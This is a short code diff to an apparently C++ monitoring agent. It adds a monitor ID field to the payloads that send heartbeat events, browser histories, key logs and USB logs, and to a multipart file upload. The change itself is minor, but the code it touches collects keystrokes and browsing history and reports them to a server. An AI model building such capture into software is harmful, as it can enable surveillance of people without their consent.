@@ -850,6 +850,7 @@ bool sendTicEvent() {
     data["Event"] = "Tic";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["MonitorId"] = selectedMonitorId.load();
     data["Username"] = username;
     
     Json::FastWriter writer;
@@ -899,6 +900,7 @@ bool sendBrowserHistories() {
     data["Event"] = "BrowserHistory";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["MonitorId"] = selectedMonitorId.load();
     data["Username"] = username;
     data["BrowserHistories"] = Json::Value(Json::arrayValue);
     
@@ -956,6 +958,7 @@ bool sendKeyLogs() {
     data["Event"] = "KeyLog";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["MonitorId"] = selectedMonitorId.load();
     data["Username"] = username;
     data["KeyLogs"] = Json::Value(Json::arrayValue);
     
@@ -1018,6 +1021,7 @@ bool sendUSBLogs() {
     data["Event"] = "USBLog";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["MonitorId"] = selectedMonitorId.load();
     data["Username"] = username;
     data["USBLogs"] = Json::Value(Json::arrayValue);
     
@@ -1235,6 +1239,10 @@ std::string httpPostFile(const std::string& url, const std::string& filePath) {
     formData += "Content-Disposition: form-data; name=\"com_name\"\r\n\r\n";
     formData += username + "\r\n";
     
+    // Include the selected monitor ID; backend checks it against the token.
+    formData += "--" + boundary + "\r\n";
+    formData += "Content-Disposition: form-data; name=\"monitor_id\"\r\n\r\n";
+    formData += std::to_string(selectedMonitorId.load()) + "\r\n";
     // Add capture time to form data
     formData += "--" + boundary + "\r\n";
     formData += "Content-Disposition: form-data; name=\"ctime\"\r\n\r\n";
